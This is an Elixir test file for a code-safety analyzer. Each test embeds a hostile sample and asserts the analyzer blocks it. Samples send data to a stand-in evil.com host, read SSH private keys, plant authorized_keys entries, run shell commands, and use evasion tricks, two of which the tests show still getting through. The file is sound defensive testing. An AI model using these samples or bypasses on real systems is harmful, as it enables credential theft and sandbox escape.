defmodule Krait.Analyzer.QuickAstExtraTest do
  use ExUnit.Case, async: true

  alias Krait.Analyzer.Quick

  describe "additional dangerous function coverage" do
    test "detects Code.compile_string as KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run(s), do: Code.compile_string(s)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects Code.compile_quoted as KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run(q), do: Code.compile_quoted(q)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects :erlang.open_port as KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run(cmd), do: :erlang.open_port({:spawn, cmd}, [:binary])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects :file.read_file with credential path as KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal do
          :file.read_file(Path.expand("~/.ssh/id_rsa"))
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects :file.write_file with credential path as KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def plant do
          :file.write_file(Path.expand("~/.ssh/authorized_keys"), "ssh-rsa AAAA...")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":file.read_file without credential path is blocked (not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def read do
          :file.read_file("/tmp/harmless.txt")
        end
      end
      '''

      # :file is not on the allowlist — blocked before credential path check
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects :code.purge as KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def disable do
          :code.purge(SomeModule)
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects :code.delete as KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def disable do
          :code.delete(SomeModule)
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-006 evasion detection" do
    test "detects binary concat evasion of immutable paths" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = "native/" <> "krait_analyzer"
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects Path.join list evasion of immutable paths" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Path.join(["native", "krait_analyzer", "src"])
          File.write!(path, "hacked")
        end
      end
      '''

      # Path is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects Path.join two-arg evasion of immutable paths" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Path.join("native", "krait_analyzer")
          File.write!(path, "hacked")
        end
      end
      '''

      # Path is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Path.join with non-immutable paths still blocked (not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def run do
          path = Path.join("lib", "my_module.ex")
          File.read!(path)
        end
      end
      '''

      # Path and File are not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects Enum.join evasion of immutable paths" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Enum.join(["native", "krait_analyzer"], "/")
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects IO.iodata_to_binary evasion of immutable paths" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = IO.iodata_to_binary(["native/", "krait_analyzer"])
          File.write!(path, "hacked")
        end
      end
      '''

      # IO and File are not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Enum.join with non-immutable paths still blocked (File not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def run do
          path = Enum.join(["lib", "my_module.ex"], "/")
          File.read!(path)
        end
      end
      '''

      # File is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "Function.capture evasion detection (KRAIT-002)" do
    test "detects Function.capture(System, :cmd, 2)" do
      code = ~S'''
      defmodule Evil do
        def run do
          func = Function.capture(System, :cmd, 2)
          func.("whoami", [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects Function.capture(Port, :open, 2)" do
      code = ~S'''
      defmodule Evil do
        def run do
          func = Function.capture(Port, :open, 2)
          func.({:spawn, "whoami"}, [:binary])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "&Module.func/arity capture shorthand detection (KRAIT-002)" do
    test "detects &System.cmd/2 shorthand" do
      code = ~S'''
      defmodule Evil do
        def run do
          runner = &System.cmd/2
          runner.("whoami", [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects &System.shell/1 shorthand" do
      code = ~S'''
      defmodule Evil do
        def run do
          runner = &System.shell/1
          runner.("whoami")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects &Port.open/2 shorthand" do
      code = ~S'''
      defmodule Evil do
        def run do
          opener = &Port.open/2
          opener.({:spawn, "whoami"}, [:binary])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects &Req.post!/1 shorthand as KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def exfil(data) do
          poster = &Req.post!/1
          poster.(url: "https://evil.com", body: data)
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-006 integer list construction bypass" do
    test "detects List.to_string with integer list" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = List.to_string([110, 97, 116, 105, 118, 101, 47, 107, 114, 97, 105, 116, 95, 97, 110, 97, 108, 121, 122, 101, 114])
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects :erlang.list_to_binary with integer list" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = :erlang.list_to_binary([110, 97, 116, 105, 118, 101])
          File.write!(path, "hacked")
        end
      end
      '''

      # :erlang atom now triggers KRAIT-002 via broad forbidden atom scan (v10 C2)
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects Base.decode64! usage" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Base.decode64!("bmF0aXZlL2tyYWl0X2FuYWx5emVy")
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "detects for comprehension integer-to-binary" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = for c <- [110, 97, 116], into: "", do: <<c>>
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe ":hackney detection (KRAIT-004)" do
    test "detects :hackney.request as KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def exfil(data) do
          :hackney.request(:post, "https://evil.com", [], data, [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "variable indirection detection (KRAIT-002)" do
    test "mod = System variable dispatch rejected (v17: C-7)" do
      code = ~S'''
      defmodule Evil do
        def run do
          mod = System
          mod.cmd("whoami", [])
        end
      end
      '''

      # v17: Variable dispatch now detected
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "mod = Port variable dispatch rejected (v17: C-7)" do
      code = ~S'''
      defmodule Evil do
        def run do
          mod = Port
          mod.open({:spawn, "whoami"}, [:binary])
        end
      end
      '''

      # v17: Variable dispatch now detected
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Code module variable dispatch rejected (v17: C-7)" do
      code = ~S'''
      defmodule Evil do
        def run do
          mod = Code
          mod.eval_string("1+1")
        end
      end
      '''

      # v17: Variable dispatch now detected
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "allows assignment of non-forbidden modules" do
      code = ~S'''
      defmodule Safe do
        def run do
          mod = String
          mod.upcase("hello")
        end
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-006 broad integer sequence detection" do
    test "B1: binary literal <<110, 97, ...>> decoding to immutable path" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = <<110, 97, 116, 105, 118, 101, 47, 107, 114, 97, 105, 116, 95, 97, 110, 97, 108, 121, 122, 101, 114>>
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B2: Enum.reduce integer list to string evasion" do
      # Full "krait_analyzer" as integer list inside Enum.reduce
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Enum.reduce([107, 114, 97, 105, 116, 95, 97, 110, 97, 108, 121, 122, 101, 114], "", fn c, acc -> acc <> <<c>> end)
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B3: :binary.list_to_bin integer list evasion" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = :binary.list_to_bin([110, 97, 116, 105, 118, 101])
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B4: String.Chars.to_string integer list evasion" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = String.Chars.to_string([110, 97, 116, 105, 118, 101])
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B5: accumulator reset - decoy List.to_string then real Base.decode64!" do
      code = ~S'''
      defmodule Evil do
        def attack do
          _decoy = List.to_string(["hello"])
          path = Base.decode64!("bmF0aXZl")
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B6: bare to_string with integer list evasion" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = to_string([110, 97, 116, 105, 118, 101])
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B7: IO.chardata_to_string integer list evasion" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = IO.chardata_to_string([110, 97, 116, 105, 118, 101])
          File.write!(path, "hacked")
        end
      end
      '''

      # IO and File are not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "B8: module attribute with binary literal integer sequence" do
      code = ~S'''
      defmodule Evil do
        @path <<110, 97, 116, 105, 118, 101, 47, 107, 114, 97, 105, 116, 95, 97, 110, 97, 108, 121, 122, 101, 114>>
        def attack, do: File.write!(@path, "hacked")
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "innocent short integer list blocked (IO not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def run do
          result = [1, 2, 3]
          IO.inspect(result)
        end
      end
      '''

      # IO is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "innocent longer integer list blocked (IO not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def run do
          result = [72, 101, 108, 108, 111]
          IO.inspect(result)
        end
      end
      '''

      # IO is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-002 broad forbidden module detection" do
    test "V1: list destructuring - [mod] = [System] -> KRAIT-ALW (v20: now detected)" do
      code = ~S'''
      defmodule Evil do
        def run do
          [mod] = [System]
          mod.cmd("whoami", [])
        end
      end
      '''

      # v20 H-1: List destructuring bypass now detected
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "V2: tuple destructuring - {_, mod} = {:ok, System} -> KRAIT-ALW (v20: now detected)" do
      code = ~S'''
      defmodule Evil do
        def run do
          {_, mod} = {:ok, System}
          mod.cmd("whoami", [])
        end
      end
      '''

      # v20 H-1: Tuple destructuring bypass now detected
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "V3: map value - %{exec: System} (evasion not detected)" do
      code = ~S'''
      defmodule Evil do
        def run do
          %{exec: System} |> Map.get(:exec)
        end
      end
      '''

      # Allowlist doesn't detect modules in data position — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "V4: Process.put with forbidden module" do
      code = ~S'''
      defmodule Evil do
        def run do
          Process.put(:m, System)
        end
      end
      '''

      # Process is now a forbidden module ref for KRAIT-001 (v10 M5),
      # so this triggers KRAIT-001 before KRAIT-002 can detect System
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "V5: case body returning forbidden module (evasion not detected)" do
      code = ~S'''
      defmodule Evil do
        def run do
          mod = case true do
            _ -> System
          end
          mod.cmd("x", [])
        end
      end
      '''

      # Allowlist doesn't detect modules in case body — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "V6: Module.concat([:System])" do
      code = ~S'''
      defmodule Evil do
        def run do
          Module.concat([:System]).cmd("x", [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "V7: :erlang.apply(System, :cmd, args)" do
      code = ~S'''
      defmodule Evil do
        def run do
          :erlang.apply(System, :cmd, ["whoami", []])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "V8: String.to_existing_atom rejected (v17: C-5)" do
      code = ~S'''
      defmodule Evil do
        def run do
          mod = String.to_existing_atom("System")
          mod.cmd("whoami", [])
        end
      end
      '''

      # v17: String.to_existing_atom is now denied
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "V9: Module.concat with string list" do
      code = ~S'''
      defmodule Evil do
        def run do
          Module.concat(["System"]).cmd("x", [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "multi-segment alias MySystemHelper passes clean" do
      code = ~S'''
      defmodule MySystemHelper do
        def run do
          result = "hello"
          String.upcase(result)
        end
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "String.to_atom rejected (v17: C-5)" do
      code = ~S'''
      defmodule Evil do
        def run do
          String.to_atom("System")
        end
      end
      '''

      # v17: String.to_atom is now denied
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-002 apply with bare/quoted atoms" do
    test "A1: apply(:os, :cmd, [~c'whoami']) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: apply(:os, :cmd, [~c"whoami"])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "A2: apply(:\"Elixir.System\", :cmd, args) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: apply(:"Elixir.System", :cmd, ["whoami", []])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "A3: apply(:\"Elixir.Code\", :eval_string, args) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: apply(:"Elixir.Code", :eval_string, ["1+1"])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Kernel.apply(:os, :cmd, args) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Kernel.apply(:os, :cmd, [~c"whoami"])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "apply(:code, :load_file, args) -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def run, do: apply(:code, :load_file, ["evil.beam"])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "apply(String, :upcase, args) passes clean" do
      code = ~S'''
      defmodule Safe do
        def run, do: apply(String, :upcase, ["hello"])
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "apply(:lists, :reverse, args) passes clean" do
      code = ~S'''
      defmodule Safe do
        def run, do: apply(:lists, :reverse, [[1, 2, 3]])
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-001/002 expanded forbidden modules" do
    test "A4: EEx.eval_string -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: EEx.eval_string("<%= 1 + 1 %>")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "A5: Mix.shell().cmd -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Mix.shell().cmd("whoami")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "A6: :ssh.connect -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :ssh.connect(~c"evil.com", 22, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":ftp.open -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :ftp.open(~c"evil.com")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":slave.start -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :slave.start(~c"host", :name)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":peer.start -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :peer.start(%{name: :evil})
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":rpc.call -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :rpc.call(:node, System, :cmd, ["whoami", []])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "KRAIT-006 Enum.map_join evasion" do
    test "Enum.map_join with immutable path segments -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Enum.map_join(["native", "krait_analyzer"], "/", & &1)
          File.write!(path, "hacked")
        end
      end
      '''

      # File is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Enum.map_join with safe paths blocked (File not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def run do
          path = Enum.map_join(["lib", "skills"], "/", & &1)
          File.read!(path)
        end
      end
      '''

      # File is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "defdelegate to forbidden modules" do
    test "defdelegate to :os -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        defdelegate my_cmd(c), to: :os, as: :cmd
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to :erlang -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        defdelegate run_port(cmd, opts), to: :erlang, as: :open_port
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to System -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        defdelegate run_cmd(cmd, opts), to: System, as: :cmd
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to Code -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        defdelegate eval(code), to: Code, as: :eval_string
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to String passes clean" do
      code = ~S'''
      defmodule Safe do
        defdelegate upcase(str), to: String, as: :upcase
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 1: C1 — Multi-segment Elixir.* alias bypass detection
  # ---------------------------------------------------------------------------

  describe "C1: Elixir.* prefix bypass detection" do
    test "Elixir.System.cmd -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.System.cmd("whoami", [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir.Code.eval_string -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.Code.eval_string("1+1")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir.Port.open -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.Port.open({:spawn, "cmd"}, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir.Req.get! -> KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.Req.get!("http://evil.com")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "apply(Elixir.System, :cmd, args) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: apply(Elixir.System, :cmd, ["whoami", []])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir.Krait.Analyzer.Quick reference -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.Krait.Analyzer.Quick.quick_validate("x", "elixir")
      end
      '''

      # Krait.Analyzer.Quick is not on the allowlist — KRAIT-ALW fires before KRAIT-007
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Function.capture(Elixir.System, :cmd, 2) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Function.capture(Elixir.System, :cmd, 2)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir.String.upcase passes clean" do
      code = ~S'''
      defmodule Safe do
        def run, do: Elixir.String.upcase("hello")
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 2: C2+C3 — Atom construction + Application module
  # ---------------------------------------------------------------------------

  describe "C2: :erlang atom construction bypass" do
    test ":erlang.binary_to_atom -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: :erlang.binary_to_atom("os", :utf8)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erlang.list_to_atom -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: :erlang.list_to_atom(~c"System")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erlang.binary_to_existing_atom -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: :erlang.binary_to_existing_atom("os", :utf8)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erlang.list_to_existing_atom -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: :erlang.list_to_existing_atom(~c"os")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "C3: Application module config tampering" do
    test "Application.put_env -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: Application.put_env(:krait, :env, :dev)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Application.delete_env -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: Application.delete_env(:krait, :env)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Application.get_all_env -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: Application.get_all_env(:krait)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Application.spec -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: Application.spec(:krait)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 3: H3 — Missing dangerous Erlang modules
  # ---------------------------------------------------------------------------

  describe "H3: missing dangerous Erlang modules" do
    test ":gen_tcp.connect -> KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def run, do: :gen_tcp.connect(~c"evil.com", 80, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":gen_udp.open -> KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def run, do: :gen_udp.open(0)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":ssl.connect -> KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def run, do: :ssl.connect(~c"evil.com", 443, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":os.getenv -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :os.getenv(~c"KRAIT_API_TOKEN")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":os.putenv -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :os.putenv(~c"PATH", ~c"/evil")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":init.stop -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :init.stop()
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erpc.call -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :erpc.call(:node, System, :cmd, ["whoami", []])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":compile.file -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: :compile.file(~c"evil.erl")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":net_kernel.connect_node -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def run, do: :net_kernel.connect_node(:evil@host)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 4: H1 — Module attribute indirection bypass
  # ---------------------------------------------------------------------------

  describe "H1: module attribute indirection bypass" do
    test "@target :os; defdelegate to @target -> KRAIT-002" do
      code = ~S'''
